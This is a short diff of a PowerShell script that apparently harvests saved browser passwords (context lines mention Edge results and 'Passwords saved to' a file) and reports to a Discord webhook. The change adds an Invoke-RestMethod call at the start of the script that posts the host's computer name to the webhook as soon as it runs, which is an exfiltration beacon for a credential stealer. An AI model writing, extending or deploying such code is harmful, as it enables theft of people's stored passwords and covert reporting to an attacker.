@@ -1,3 +1,8 @@
+$WebhookUrl = $env:DISCORD_WEBHOOK_URL
+
+# Optional: Send immediate ping to confirm execution
+Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body (@{ content = "✅ New script triggered on $env:COMPUTERNAME" } | ConvertTo-Json) -ContentType 'application/json'
+
 # Check current PowerShell version
 if ($PSVersionTable.PSVersion.Major -lt 7) {
     # Check if pwsh is available
@@ -267,10 +272,7 @@ $edgeResults | ForEach-Object {
 Write-Host "Passwords saved to: $outputFile"
 
 # Get webhook URL from environment variable
-$WebhookUrl = $env:DISCORD_WEBHOOK_URL
-
-# Optional: Send immediate ping to confirm execution
-Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body (@{ content = "✅ New script triggered on $env:COMPUTERNAME" } | ConvertTo-Json) -ContentType 'application/json'
+# $WebhookUrl = $env:DISCORD_WEBHOOK_URL
 
 if ([string]::IsNullOrEmpty($webhookUrl)) {
     Write-Error "No webhook URL set. Exiting."
